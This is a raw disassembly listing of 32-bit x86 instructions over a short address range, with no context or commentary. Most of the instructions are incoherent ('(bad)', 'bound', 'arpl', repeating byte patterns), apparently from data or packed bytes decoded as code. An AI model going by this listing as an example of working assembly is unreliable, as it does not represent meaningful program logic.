  414df2:	mov    ss,WORD PTR [ecx+eiz*2+0x40412e5f]
  414df9:	inc    eax
  414dfa:	inc    ebx
  414dfb:	int3   
  414dfc:	add    BYTE PTR ds:0x56240,al
  414e02:	inc    ebx
  414e03:	inc    eax
  414e04:	inc    eax
  414e05:	add    BYTE PTR [ecx+0x62],al
  414e08:	bound  eax,QWORD PTR [eax]
  414e0a:	int3   
  414e0b:	inc    eax
  414e0c:	inc    ebx
  414e0d:	add    eax,0x43624041
  414e12:	adc    BYTE PTR [ecx+0x5],al
  414e15:	inc    eax
  414e16:	arpl   WORD PTR [edx],dx
  414e18:	xor    BYTE PTR [ecx-0x40],al
  414e1b:	push   edi
  414e1c:	lahf   
  414e1d:	stc    
  414e1e:	jbe    0x414e83
  414e20:	jno    0x414e65
  414e22:	repz and DWORD PTR [edi+0x65],ebx
  414e26:	inc    ebx
  414e27:	dec    ebx
  414e28:	int    0x30
  414e2a:	bound  eax,QWORD PTR [edx-0x61]
  414e2d:	mov    edi,0x60d870f5
  414e32:	or     al,0xa0
  414e34:	bound  eax,QWORD PTR [ebx+0x40]
  414e37:	adc    BYTE PTR ds:0x4158cc40,al
  414e3d:	inc    ebx
  414e3e:	bound  eax,QWORD PTR [ecx+0x40]
  414e41:	add    eax,0x4140
  414e46:	and    eax,0x40400062
  414e4b:	add    eax,0x84404340
  414e50:	int3   
  414e51:	js     0x414e53
  414e53:	inc    ecx
  414e54:	adc    BYTE PTR [edx+0xf],ah
  414e57:	pop    esi
  414e58:	mov    edi,0x4eb86764
  414e5d:	xchg   ebx,eax
  414e5e:	sub    eax,0x1f80bf75
  414e63:	and    DWORD PTR [ebp+0x7cbf24e8],ecx
  414e69:	ret    
  414e6a:	sub    al,0x2d
  414e6c:	inc    ebx
  414e6d:	and    ch,cl
  414e6f:	dec    ecx
  414e70:	lds    ebp,FWORD PTR [edi+ecx*4+0x4c]
  414e74:	nop
  414e75:	push   0x2b42b607
  414e7a:	and    BYTE PTR [esp+eax*4-0x34],cl
  414e7e:	popa   
  414e7f:	add    eax,0x6d436856
  414e84:	inc    ebx
  414e85:	sti    
  414e86:	inc    ebx
  414e87:	push   esp
  414e88:	clc    
  414e89:	add    BYTE PTR [eax+0x41],al
  414e8c:	inc    eax
  414e8d:	inc    ebx
  414e8e:	bound  ax,DWORD PTR ds:0x40434100
  414e95:	add    eax,0x40054062
  414e9a:	bound  eax,QWORD PTR [ecx+0x40]
  414e9d:	inc    ebx
  414e9e:	inc    eax
  414e9f:	add    eax,0x25405841
  414ea4:	bound  eax,QWORD PTR [eax+0x43]
  414ea7:	inc    eax
  414ea8:	adc    BYTE PTR [edx+0x7fd169c8],al
  414eae:	pusha  
  414eaf:	push   ecx
  414eb0:	imul   esi,DWORD PTR [ebx+ebx*4+0x42],0x1c
  414eb5:	mov    bh,0xb7
  414eb7:	inc    eax
  414eb8:	sub    al,0x3a
  414eba:	test   al,0x21
  414ebc:	(bad)  
  414ebd:	(bad)  
  414ebe:	and    edx,DWORD PTR [eax+0x31605d7a]
  414ec4:	fist   DWORD PTR [ecx]
  414ec6:	inc    esi
  414ec7:	cmp    ah,BYTE PTR [esi+0x34]
  414eca:	es push edx
  414ecc:	mov    ah,0xe6
  414ece:	popa   
  414ecf:	inc    edx
  414ed0:	mov    ebp,0x43414080
  414ed5:	inc    eax
  414ed6:	add    eax,0x43406262
  414edb:	inc    ecx
  414edc:	adc    BYTE PTR [eax],al
  414ede:	inc    eax
  414edf:	add    eax,0x43000562
  414ee4:	add    BYTE PTR [ecx+0x40],al
  414ee7:	inc    eax
  414ee8:	add    eax,0x400062
  414eed:	inc    ebx
  414eee:	inc    eax
  414eef:	js     0x414f32
  414ef1:	inc    ecx
  414ef2:	bound  eax,QWORD PTR [eax-0x2e]
  414ef5:	push   eax
  414ef6:	inc    ecx
  414ef7:	bound  ebx,QWORD PTR [ecx]
  414ef9:	shr    DWORD PTR [ecx-0x3b],cl
  414efc:	fmul   st(3),st
  414efe:	inc    ebx
  414eff:	push   ebx
  414f00:	popa   
  414f01:	ret    
  414f02:	pop    eax
  414f03:	dec    esp
  414f04:	bound  esi,QWORD PTR ds:0xd352ca30
  414f0a:	push   edx
  414f0b:	inc    edx
  414f0c:	addr16 fs pop esp
  414f0f:	stc    
  414f10:	loope  0x414f58
  414f12:	imul   esp,DWORD PTR [esp+esi*1+0x4b],0x47
  414f17:	pop    edx
  414f18:	and    BYTE PTR [ecx+0x3c45c0ac],dh
  414f1e:	test   DWORD PTR [edi],ebx
  414f20:	in     eax,0xf7
  414f22:	jae    0x414f28
  414f24:	and    ah,BYTE PTR [esi+0x43]
  414f27:	cmp    BYTE PTR [edx+0x40],ah
  414f2a:	add    eax,0x40430041
  414f2f:	inc    eax
  414f30:	inc    ecx
  414f31:	inc    eax
  414f32:	inc    eax
  414f33:	bound  eax,QWORD PTR ds:0x5624300
  414f39:	add    BYTE PTR [eax+0x40],al
  414f3c:	add    BYTE PTR [ecx+0x43],al
  414f3f:	add    BYTE PTR [eax+0x41],al
  414f42:	add    eax,0x40436200
  414f47:	inc    eax
  414f48:	add    eax,0x5c2e2562
  414f4d:	test   al,0x3e
  414f4f:	std    
  414f50:	nop
  414f51:	pop    ebp
  414f52:	in     eax,0x14
  414f54:	push   edx
  414f55:	imul   edi,eax,0xffffffc5
  414f58:	mov    eax,ds:0x4802c5b0
  414f5d:	out    dx,al
  414f5e:	sbb    al,0xc3
  414f60:	inc    ebx
  414f61:	popa   
  414f62:	aaa    
  414f63:	push   esp
  414f64:	shl    BYTE PTR [ebx+0x20],1
  414f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f68:	shl    edi,1
  414f6a:	sbb    DWORD PTR [ebp+0x73],esi
  414f6d:	pop    esp
  414f6e:	cs jae 0x414fa1
  414f71:	cwde   
  414f72:	arpl   WORD PTR [ebx+0x68],dx
  414f75:	add    dh,BYTE PTR [esi+0x4120350f]
  414f7b:	inc    eax
  414f7c:	add    eax,0x41624340
  414f81:	test   BYTE PTR [eax],al
  414f83:	and    eax,0x404043
  414f88:	add    BYTE PTR ds:0x626210,al
  414f8e:	add    eax,0x43404140
  414f93:	inc    eax
  414f94:	inc    ecx
  414f95:	add    eax,0x10664062
  414f9a:	inc    ebx
  414f9b:	bound  edi,QWORD PTR [edi]
  414f9d:	push   edi
  414f9e:	push   edx
  414f9f:	int    0xa8
  414fa1:	push   ecx
  414fa2:	(bad)  
  414fa3:	push   esi
  414fa4:	adc    ebp,DWORD PTR [esi+0x6b]
  414fa7:	adc    ebp,ecx
  414fa9:	addr16 lahf 
  414fab:	dec    ecx
  414fac:	and    DWORD PTR ds:0x7bef608c,esi
  414fb2:	inc    ecx
  414fb3:	mov    ch,0x4c
  414fb5:	inc    ecx
  414fb6:	push   ecx
  414fb7:	pop    ecx
  414fb8:	bound  edi,QWORD PTR [ebx+eax*2+0x2411a1c3]
  414fbf:	(bad)  
  414fc1:	arpl   WORD PTR [eax],si
  414fc3:	outs   dx,BYTE PTR ds:[esi]
  414fc4:	xlat   BYTE PTR ds:[ebx]
  414fc5:	push   cs
  414fc6:	push   cs
  414fc7:	dec    ebx
  414fc8:	add    eax,0x4041cc
  414fcd:	add    BYTE PTR [eax],al
  414fcf:	inc    eax
  414fd0:	inc    eax
  414fd1:	inc    ebx
  414fd2:	bound  eax,QWORD PTR [eax]
  414fd4:	inc    eax
  414fd5:	inc    eax
  414fd6:	add    eax,0x62434162
  414fdb:	inc    eax
  414fdc:	js     0x414fee
  414fde:	inc    ecx
  414fdf:	add    eax,0x5404325
  414fe4:	bound  eax,QWORD PTR [eax+0x40]
  414fe7:	inc    ecx
  414fe8:	inc    ebx
  414fe9:	cmp    bl,al
  414feb:	pop    eax
  414fec:	hlt    
  414fed:	mov    eax,ds:0x26d06b33
  414ff2:	test   al,0x43
  414ff4:	add    DWORD PTR ds:0xd038ad4e,edi
  414ffa:	pusha  
  414ffb:	fld    QWORD PTR [edi]
  414ffd:	and    DWORD PTR [ebx+esi*2+0x6b36629e],edx
  415004:	sub    esp,DWORD PTR [ebx]
  415006:	jmp    FWORD PTR [eax-0x58]
  415009:	les    ecx,FWORD PTR [ebx]
  41500b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41500c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41500d:	loop   0x415037
  41500f:	push   edx
  415010:	inc    edx
  415011:	dec    edi
  415012:	mov    ds:0x43624125,eax
  415017:	add    BYTE PTR [eax],dl
  415019:	inc    eax
  41501a:	add    BYTE PTR ds:0x62410040,al
  415020:	inc    eax
  415021:	add    ah,cl
  415023:	int3   
  415024:	int3   
  415025:	int3   
  415026:	int3   
  415027:	int3   
  415028:	int3   
  415029:	int3   
  41502a:	int3   
  41502b:	int3   
  41502c:	int3   
  41502d:	int3   
  41502e:	int3   
  41502f:	int3   
  415030:	inc    ebx
  415031:	int3   
  415032:	inc    eax
  415033:	add    eax,0x78434040
  415038:	bound  eax,QWORD PTR [ecx+0x78]
  41503b:	add    eax,0x62404043
  415040:	mov    esi,0x266267d6
  415045:	xor    eax,DWORD PTR [eax-0x2b]
  415048:	inc    ebx
  415049:	dec    eax
  41504a:	pop    ss
  41504b:	neg    DWORD PTR [eax-0x2d9da76f]
  415051:	push   esi
  415052:	arpl   WORD PTR [esi+0x66],dx
  415055:	push   ebp
  415056:	cmp    eax,0x415c5245
  41505b:	inc    eax
  41505c:	add    eax,0x43436240
  415061:	add    eax,0x62004040
  415066:	inc    eax
  415067:	add    BYTE PTR [ecx+0x40],al
  41506a:	inc    ebx
  41506b:	test   BYTE PTR ds:0x58054041,ah
  415071:	inc    eax
  415072:	inc    eax
  415073:	bound  eax,QWORD PTR [eax+0x66]
  415076:	inc    ecx
  415077:	inc    eax
  415078:	add    eax,0x73554100
  41507d:	int    0x42
  41507f:	push   ebx
  415080:	dec    esp
  415081:	dec    esi
  415082:	mov    eax,ds:0xcd436813
  415087:	mov    ebp,0xf5bb94a8
  41508c:	push   edx
  41508d:	add    BYTE PTR [eax],al
  41508f:	inc    ebx
  415090:	inc    eax
  415091:	bound  eax,QWORD PTR ds:0x25404110
  415097:	add    ah,cl
  415099:	inc    ebx
  41509a:	add    eax,0x40402562
  41509f:	add    BYTE PTR [eax+0x40],al
  4150a2:	inc    ecx
  4150a3:	inc    ecx
  4150a4:	add    eax,0x78434025
  4150a9:	bound  eax,QWORD PTR [eax-0x7c]
  4150ac:	inc    eax
  4150ad:	inc    ecx
  4150ae:	fadd   DWORD PTR [eax]
  4150b0:	push   0xffffffcf
  4150b2:	mov    ds:0x4f26591b,al
  4150b7:	bound  esi,QWORD PTR [ecx+eax*2]
  4150ba:	add    ah,dl
  4150bc:	mov    bl,0x8
  4150be:	test   al,0xe6
  4150c0:	push   esi
  4150c1:	inc    ebx
  4150c2:	dec    ebx
  4150c3:	cs inc ebp
  4150c5:	data16 arpl sp,ax
  4150c8:	cmp    DWORD PTR [eax],esi
  4150ca:	adc    ecx,DWORD PTR [edi-0xe]
  4150cd:	jae    0x41506d
  4150cf:	dec    edi
  4150d0:	push   esp
  4150d1:	push   esp
  4150d2:	(bad)
  4150d5:	push   0x43404041
  4150da:	int3   
  4150db:	add    BYTE PTR ds:0x56240,al
  4150e1:	inc    ebx
  4150e2:	inc    eax
  4150e3:	inc    eax
  4150e4:	add    BYTE PTR [ecx+0x62],al
  4150e7:	bound  eax,QWORD PTR [eax]
  4150e9:	int3   
  4150ea:	inc    eax
  4150eb:	inc    ebx
  4150ec:	add    eax,0x43624041
  4150f1:	adc    BYTE PTR [ecx+0x5],al
  4150f4:	inc    eax
  4150f5:	and    DWORD PTR gs:[edi+eax*2+0x524b1c8a],edx
  4150fd:	retf   
  4150fe:	scas   eax,DWORD PTR es:[edi]
  4150ff:	push   ebp
  415100:	test   DWORD PTR [ebx+0x4b269323],esp
  415106:	(bad)  
  415107:	cld    
  415108:	inc    ebx
  415109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41510a:	pop    ss
  41510b:	cmp    eax,0x604a9908
  415110:	nop
  415111:	lds    esp,FWORD PTR [ebx+0x354c665e]
  415117:	and    BYTE PTR [ebx-0x25],bl
  41511a:	jns    0x4150f3
  41511c:	jno    0x415180
  41511e:	inc    ebx
  41511f:	inc    eax
  415120:	adc    BYTE PTR ds:0x4158cc40,al
  415126:	inc    ebx
  415127:	bound  eax,QWORD PTR [ecx+0x40]
  41512a:	add    eax,0x4140
  41512f:	and    eax,0x40400062
  415134:	add    eax,0x84404340
  415139:	int3   
  41513a:	js     0x41513c
  41513c:	inc    ecx
  41513d:	adc    BYTE PTR [edx+0xf],ah
  415140:	test   BYTE PTR [eax+0x43],al
  415143:	inc    ebx
  415144:	inc    eax
  415145:	popa   
  415146:	dec    ebx
  415147:	pop    eax
  415148:	ret    
  415149:	push   esp
  41514a:	lods   al,BYTE PTR ds:[esi]
  41514b:	rol    DWORD PTR [eax+0x43],1
  41514e:	icebp  
  41514f:	push   ebx
  415150:	cs inc ecx
  415152:	imul   ecx,DWORD PTR [edi+0x40],0x61
  415156:	bound  edi,QWORD PTR [edx]
  415158:	sbb    eax,DWORD PTR ds:0xb405643
  41515e:	jns    0x41510c
  415160:	arpl   WORD PTR [eax-0x5ec25760],di
  415166:	icebp  
  415167:	bound  edi,QWORD PTR [ebp+eax*1-0x3a]
  41516b:	add    BYTE PTR [eax+0x41],al
  41516e:	inc    eax
  41516f:	inc    ebx
  415170:	bound  ax,DWORD PTR ds:0x40434100
  415177:	add    eax,0x40054062
  41517c:	bound  eax,QWORD PTR [ecx+0x40]
  41517f:	inc    ebx
  415180:	inc    eax
  415181:	add    eax,0x25405841
  415186:	bound  eax,QWORD PTR [eax+0x43]
  415189:	inc    eax
  41518a:	adc    BYTE PTR [ebp+0x26b1ffec],dh
  415190:	enter  0x4340,0x41
  415194:	and    eax,DWORD PTR [eax+0x2f]
  415197:	fs inc edi
  415199:	bound  eax,QWORD PTR [ecx-0x1a5f1ebd]
  41519f:	bound  edi,QWORD PTR [edx]
  4151a1:	xor    eax,DWORD PTR [edi]
  4151a3:	xor    al,cl
  4151a5:	and    ecx,esp
  4151a7:	aad    0x6e
  4151a9:	cwde   
  4151aa:	cmp    al,0x50
  4151ac:	cmovb  esp,DWORD PTR [edi+0x6362a828]
  4151b3:	inc    edi
  4151b4:	jg     0x415216
  4151b6:	vpacksswb xmm3,xmm0,XMMWORD PTR ds:0x41408540
  4151be:	inc    ebx
  4151bf:	inc    eax
  4151c0:	add    eax,0x43406262
  4151c5:	inc    ecx
  4151c6:	adc    BYTE PTR [eax],al
  4151c8:	inc    eax
  4151c9:	add    eax,0x43000562
  4151ce:	add    BYTE PTR [ecx+0x40],al
  4151d1:	inc    eax
  4151d2:	add    eax,0x400062
  4151d7:	inc    ebx
  4151d8:	inc    eax
  4151d9:	js     0x41521c
  4151db:	inc    ecx
  4151dc:	bound  eax,QWORD PTR [eax+0x12]
  4151df:	xor    ch,BYTE PTR [ebx]
  4151e1:	fs sbb ah,0xc0
  4151e5:	inc    ebx
  4151e6:	aad    0x4d
  4151e8:	out    0xfa,al
  4151ea:	bound  esp,QWORD PTR [esi+0x43]
  4151ed:	nop
  4151ee:	lods   eax,DWORD PTR ds:[esi]
  4151ef:	popa   
  4151f0:	loope  0x41520f
  4151f2:	inc    ebp
  4151f3:	or     al,0x22
  4151f5:	js     0x415230
  4151f7:	or     BYTE PTR [edi+0x41054062],bh
  4151fd:	add    BYTE PTR [ebx+0x40],al
  415200:	inc    eax
  415201:	inc    ecx
  415202:	inc    eax
  415203:	inc    eax
  415204:	bound  eax,QWORD PTR ds:0x5624300
  41520a:	add    BYTE PTR [eax+0x40],al
  41520d:	add    BYTE PTR [ecx+0x43],al
  415210:	add    BYTE PTR [eax+0x41],al
  415213:	add    eax,0x40436200
  415218:	inc    eax
  415219:	add    eax,0x70c02162
  41521e:	push   eax
  41521f:	inc    ebx
  415220:	or     ah,BYTE PTR [ebx+0x7c1262d4]
  415226:	inc    ebx
  415227:	ror    DWORD PTR [eax],1
  415229:	push   esi
  41522a:	and    esp,DWORD PTR [ebx]
  41522c:	pusha  
  41522d:	cmp    cl,al
  41522f:	xchg   BYTE PTR [eax+ebp*8-0x33ee3bb1],dh
  415236:	fild   QWORD PTR [edx]
  415238:	jo     0x4152a6
  41523a:	and    eax,0x5404165
  41523f:	inc    eax
  415240:	inc    ebx
  415241:	bound  eax,QWORD PTR [ecx-0x7c]
  415244:	add    BYTE PTR ds:0x404043,ah
  41524a:	add    BYTE PTR ds:0x626210,al
  415250:	add    eax,0x43404140
  415255:	inc    eax
  415256:	inc    ecx
  415257:	add    eax,0x10664062
  41525c:	inc    ebx
  41525d:	bound  eax,QWORD PTR [esi+0x532ca8d4]
  415263:	out    dx,al
  415264:	ja     0x4152d7
  415266:	daa    
  415267:	mov    BYTE PTR [edi+0x22023be4],bh
  41526d:	or     BYTE PTR fs:[eax+0x2194412a],ch
  415274:	adc    al,0x54
  415276:	jmp    0x4684648c
  41527b:	push   ebx
  41527c:	sub    al,0x29
  41527e:	mov    ebp,0x39304848
  415283:	and    DWORD PTR [esp+eiz*4+0x4c15416e],esp
  41528a:	and    BYTE PTR [ecx+0x2e],cl
  41528d:	fs in  al,dx
  41528f:	add    al,0xcd
  415291:	inc    edi
  415292:	add    eax,0x4041cc
  415297:	add    BYTE PTR [eax],al
  415299:	inc    eax
  41529a:	inc    eax
  41529b:	inc    ebx
  41529c:	bound  eax,QWORD PTR [eax]
  41529e:	inc    eax
  41529f:	inc    eax
  4152a0:	add    eax,0x62434162
  4152a5:	inc    eax
  4152a6:	js     0x4152b8
  4152a8:	inc    ecx
  4152a9:	add    eax,0x5404325
  4152ae:	bound  eax,QWORD PTR [eax+0x40]
  4152b1:	inc    ecx
  4152b2:	inc    ebx
  4152b3:	pop    es
  4152b4:	mov    eax,ds:0x341f71ed
  4152b9:	inc    ebp
  4152ba:	test   ebp,edx
  4152bc:	push   esp
  4152bd:	mov    eax,ds:0x4934a864
  4152c2:	inc    ebx
  4152c3:	cmp    BYTE PTR [eax+0x4d],ah
  4152c6:	push   ebx
  4152c7:	adc    BYTE PTR [eax],ch
  4152c9:	cmp    al,0x90
  4152cb:	aaa    
  4152cc:	and    eax,0x5554d5a5
  4152d1:	sub    al,0x15
  4152d3:	sbb    eax,0x8026abc9
  4152d8:	and    al,0x64
  4152da:	inc    ebx
  4152db:	(bad)  
  4152dc:	and    al,0x9
  4152de:	gs ret 
  4152e0:	fst    DWORD PTR [edx-0x2f]
  4152e3:	xchg   esp,eax
  4152e4:	xchg   DWORD PTR [ebx+0x43624125],esp
  4152ea:	add    BYTE PTR [eax],dl
  4152ec:	inc    eax
  4152ed:	add    BYTE PTR ds:0x62410040,al
  4152f3:	inc    eax
  4152f4:	add    BYTE PTR [ebx-0x34],al
  4152f7:	inc    eax
  4152f8:	add    eax,0x78434040
  4152fd:	bound  eax,QWORD PTR [ecx+0x78]
  415300:	add    eax,0x62404043
  415305:	fs inc esp
  415307:	bound  ebp,QWORD PTR [eax]
  415309:	test   eax,0x44fa5240
  41530f:	inc    edi
  415310:	nop
  415311:	dec    edx
  415312:	inc    esi
  415313:	popa   
  415314:	and    BYTE PTR [esi+0x5a],ah
  415317:	and    al,0xbf
  415319:	ror    edi,1
  41531b:	mov    ch,0x33
  41531d:	inc    ecx
  41531e:	and    al,0xd0
  415320:	ins    BYTE PTR es:[edi],dx
  415321:	fcom   st(3)
  415323:	dec    eax
  415324:	imul   edx,DWORD PTR [edx-0x2],0x404141a9
  41532b:	test   eax,0x40054041
  415330:	bound  eax,QWORD PTR [ebx+0x43]
  415333:	add    eax,0x62004040
  415338:	inc    eax
  415339:	add    BYTE PTR [ecx+0x40],al
  41533c:	inc    ebx
  41533d:	test   BYTE PTR ds:0x58054041,ah
  415343:	inc    eax
  415344:	inc    eax
  415345:	bound  eax,QWORD PTR [eax+0x66]
  415348:	inc    ecx
  415349:	inc    eax
  41534a:	add    eax,0xfbcd2300
  41534f:	inc    ebp
  415350:	je     0x415395
  415352:	pusha  
  415353:	xor    al,0x2d
  415355:	xchg   DWORD PTR [eax+0x4030a8ab],ebp
  41535b:	stos   DWORD PTR es:[edi],eax
  41535c:	lods   eax,DWORD PTR ds:[esi]
  41535d:	and    eax,0x48624240
  415362:	add    BYTE PTR [eax],al
  415364:	inc    ebx
  415365:	inc    eax
  415366:	bound  eax,QWORD PTR ds:0x25404110
  41536c:	add    ah,cl
  41536e:	inc    ebx
  41536f:	add    eax,0x40402562
  415374:	add    BYTE PTR [eax+0x40],al
  415377:	inc    ecx
  415378:	inc    ecx
  415379:	add    eax,0x78434025
  41537e:	bound  eax,QWORD PTR [eax-0x7c]
  415381:	inc    eax
  415382:	inc    ecx
  415383:	inc    eax
  415384:	xor    al,0x1
  415386:	push   edx
  415387:	add    DWORD PTR [ebx-0x40bfb80e],ebp
  41538d:	arpl   WORD PTR [eiz*1+0x5085f8a0],dx
  415394:	xor    al,0x52
  415396:	push   edx
  415397:	and    al,0x15
  415399:	test   al,0x43
  41539b:	inc    eax
  41539c:	mov    edi,0x4528c5e2
  4153a1:	adc    dl,BYTE PTR [eax+0x40413440]
  4153a7:	inc    eax
  4153a8:	inc    ebx
  4153a9:	int3   
  4153aa:	add    BYTE PTR ds:0x56240,al
  4153b0:	inc    ebx
  4153b1:	inc    eax
  4153b2:	inc    eax
  4153b3:	add    BYTE PTR [ecx+0x62],al
  4153b6:	bound  eax,QWORD PTR [eax]
  4153b8:	int3   
  4153b9:	inc    eax
  4153ba:	inc    ebx
  4153bb:	add    eax,0x43624041
  4153c0:	adc    BYTE PTR [ecx+0x5],al
  4153c3:	inc    eax
  4153c4:	es pop ebp
  4153c6:	inc    ebp
  4153c7:	add    eax,0xbf403248
  4153cc:	sahf   
  4153cd:	in     eax,0x40
  4153cf:	in     al,0x42
  4153d1:	inc    ebx
  4153d2:	push   eax
  4153d3:	dec    eax
  4153d4:	push   0x4362dcf8
  4153d9:	inc    eax
  4153da:	adc    BYTE PTR ds:0x4158cc40,al
  4153e0:	inc    ebx
  4153e1:	bound  eax,QWORD PTR [ecx+0x40]
  4153e4:	add    eax,0x4140
  4153e9:	and    eax,0x40400062
  4153ee:	add    eax,0x84404340
  4153f3:	int3   
  4153f4:	js     0x4153f6
  4153f6:	inc    ecx
  4153f7:	adc    BYTE PTR [edx+0xf],ah
  4153fa:	bound  esi,QWORD PTR [ebp-0x2f]
  4153fd:	inc    eax
  4153fe:	popa   
  4153ff:	loope  0x41546a
  415401:	imul   esp,DWORD PTR [eax+0x5840323c],0x152d7117
  41540b:	bound  edx,QWORD PTR [ebx+0x40]
  41540e:	mov    eax,ds:0x40414000
  415413:	inc    ebx
  415414:	bound  ax,DWORD PTR ds:0x40434100
  41541b:	add    eax,0x40054062
  415420:	bound  eax,QWORD PTR [ecx+0x40]
  415423:	inc    ebx
  415424:	inc    eax
  415425:	add    eax,0x25405841
  41542a:	bound  eax,QWORD PTR [eax+0x43]
  41542d:	inc    eax
  41542e:	adc    bl,dh
  415430:	push   edx
  415431:	inc    esp
  415432:	inc    ecx
  415433:	jle    0x415450
  415435:	adc    BYTE PTR [esi+0x17],ch
  415438:	aad    0xbd
  41543a:	mov    ss,WORD PTR [ebx+eax*2]
  41543d:	inc    eax
  41543e:	loop   0x41543f
  415440:	cmp    esi,DWORD PTR [edx+edx*1+0x62]
  415444:	sub    BYTE PTR [eax-0x41],al
  415447:	shl    DWORD PTR ds:0x40546a4d,1
  41544d:	inc    eax
  41544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41544f:	jecxz  0x4154b5
  415451:	mov    ecx,0x41403425
  415456:	inc    ebx
  415457:	inc    eax
  415458:	add    eax,0x43406262
  41545d:	inc    ecx
  41545e:	adc    BYTE PTR [eax],al
  415460:	inc    eax
  415461:	add    eax,0x43000562
  415466:	add    BYTE PTR [ecx+0x40],al
  415469:	inc    eax
  41546a:	add    eax,0x400062
  41546f:	inc    ebx
  415470:	inc    eax
  415471:	js     0x4154b4
  415473:	inc    ecx
  415474:	bound  eax,QWORD PTR [eax+0x40]
  415477:	adc    BYTE PTR [eax+0x28],al
  41547a:	dec    eax
  41547b:	pop    ebp
  41547c:	arpl   WORD PTR [edx+eax*2+0x40],ax
  415480:	mov    eax,ds:0x58353ce7
  415485:	mov    al,ds:0x69394044
  41548a:	pop    esi
  41548b:	inc    ecx
  41548c:	int3   
  41548d:	ret    
  41548e:	inc    esi
  41548f:	inc    ecx
  415490:	out    0x63,eax
  415492:	dec    ebp
  415493:	push   esp
  415494:	cld    
  415495:	mov    esp,0x4062d047
  41549a:	add    eax,0x40430041
  41549f:	inc    eax
  4154a0:	inc    ecx
  4154a1:	inc    eax
  4154a2:	inc    eax
  4154a3:	bound  eax,QWORD PTR ds:0x5624300
  4154a9:	add    BYTE PTR [eax+0x40],al
  4154ac:	add    BYTE PTR [ecx+0x43],al
  4154af:	add    BYTE PTR [eax+0x41],al
  4154b2:	add    eax,0x40436200
  4154b7:	inc    eax
  4154b8:	add    eax,0xa16f3962
  4154bd:	cmp    DWORD PTR [esi],ebx
  4154bf:	inc    ebx
  4154c0:	test   BYTE PTR [eax-0x1],al
  4154c3:	imul   ax,bx,0x7134
  4154c8:	inc    ebx
  4154c9:	inc    eax
  4154ca:	cmp    DWORD PTR [edi],esp
  4154cc:	fs dec eax
  4154ce:	fidiv  WORD PTR [eax+edx*4]
  4154d1:	inc    eax
  4154d2:	(bad)  
  4154d3:	mov    esi,0x40054041
  4154d8:	inc    ebx
  4154d9:	bound  eax,QWORD PTR [ecx-0x7c]
  4154dc:	add    BYTE PTR ds:0x404043,ah
  4154e2:	add    BYTE PTR ds:0x626210,al
  4154e8:	add    eax,0x43404140
  4154ed:	inc    eax
  4154ee:	inc    ecx
  4154ef:	add    eax,0x10664062
  4154f4:	inc    ebx
  4154f5:	bound  edx,QWORD PTR [edx+0xd]
  4154f8:	pushf  
  4154f9:	dec    eax
  4154fa:	iret   
  4154fb:	inc    eax
  4154fc:	and    esi,DWORD PTR [eax-0x3b]
  4154ff:	retf   
  415500:	adc    eax,0x3f4043a2
  415505:	pusha  
  415506:	add    BYTE PTR [esi-0x37],ah
  415509:	ret    
  41550a:	rcl    ecx,1
  41550c:	jns    0x41553b
  41550e:	(bad)  [ebx+0x40edbc41]
  415514:	arpl   WORD PTR [eax+0x41414865],dx
  41551a:	loop   0x415521
  41551c:	int3   
  41551d:	inc    ecx
  41551e:	inc    eax
  41551f:	add    BYTE PTR [eax],al
  415521:	add    BYTE PTR [eax+0x40],al
  415524:	inc    ebx
  415525:	bound  eax,QWORD PTR [eax]
  415527:	inc    eax
  415528:	inc    eax
  415529:	add    eax,0x62434162
  41552e:	inc    eax
  41552f:	js     0x415541
  415531:	inc    ecx
  415532:	add    eax,0x5404325
  415537:	bound  eax,QWORD PTR [eax+0x40]
  41553a:	inc    ecx
  41553b:	inc    ebx
  41553c:	inc    eax
  41553d:	and    dh,cl
  41553f:	imul   eax,DWORD PTR [eax-0x53],0x2240eff8
  415546:	inc    edi
  415547:	fs aam 0x2c
  41554a:	test   al,0x82
  41554c:	aas    
  41554d:	aas    
  41554e:	mov    ds:0x62626952,eax
  415553:	sub    BYTE PTR [eax+0x21],al
  415556:	adc    edx,ebp
  415558:	aad    0xcb
  41555a:	push   0x25
  41555c:	inc    ecx
  41555d:	bound  eax,QWORD PTR [ebx+0x0]
  415560:	adc    BYTE PTR [eax+0x0],al
  415563:	add    eax,0x62410040
  415568:	inc    eax
  415569:	add    BYTE PTR [ebx-0x34],al
  41556c:	inc    eax
  41556d:	add    eax,0x78434040
  415572:	bound  eax,QWORD PTR [ecx+0x78]
  415575:	add    eax,0x62404043
  41557a:	inc    edx
  41557b:	inc    eax
  41557c:	and    esp,ebp
  41557e:	jne    0x41559a
  415580:	dec    ecx
  415581:	xor    DWORD PTR fs:[eax+0x21],eax
  415585:	xor    esp,DWORD PTR [ecx]
  415587:	stc    
  415588:	popa   
  415589:	fs je  0x4155c8
  41558c:	pusha  
  41558d:	inc    edi
  41558e:	push   ebp
  41558f:	(bad)
  415594:	sbb    DWORD PTR [ebx],esp
  415596:	imul   ecx,DWORD PTR [eax+0x62],0x6040470d
  41559d:	jbe    0x415603
  41559f:	cmp    ch,al
  4155a1:	retf   
  4155a2:	test   BYTE PTR [eax+0x3f],al
  4155a5:	inc    ecx
  4155a6:	inc    eax
  4155a7:	add    eax,0x43436240
  4155ac:	add    eax,0x62004040
  4155b1:	inc    eax
  4155b2:	add    BYTE PTR [ecx+0x40],al
  4155b5:	inc    ebx
  4155b6:	test   BYTE PTR ds:0x58054041,ah
  4155bc:	inc    eax
  4155bd:	inc    eax
  4155be:	bound  eax,QWORD PTR [eax+0x66]
  4155c1:	inc    ecx
  4155c2:	inc    eax
  4155c3:	add    eax,0x10522b00
  4155c8:	aam    0x5b
  4155ca:	inc    ebx
  4155cb:	cs sar bl,1
  4155ce:	int    0x41
  4155d0:	push   edi
  4155d1:	xor    eax,0x62814090
  4155d6:	jnp    0x415631
  4155d8:	jb     0x4155da
  4155da:	in     al,dx
  4155db:	inc    eax
  4155dc:	push   ecx
  4155dd:	ja     0x41559c
  4155df:	push   0x4043a0bd
  4155e4:	sub    BYTE PTR [edi+0x55],0x42
  4155e8:	mov    esp,0x2e40d1c3
  4155ed:	add    BYTE PTR [eax],al
  4155ef:	inc    ebx
  4155f0:	inc    eax
  4155f1:	bound  eax,QWORD PTR ds:0x25404110
  4155f7:	add    ah,cl
  4155f9:	inc    ebx
  4155fa:	add    eax,0x40402562
  4155ff:	add    BYTE PTR [eax+0x40],al
  415602:	inc    ecx
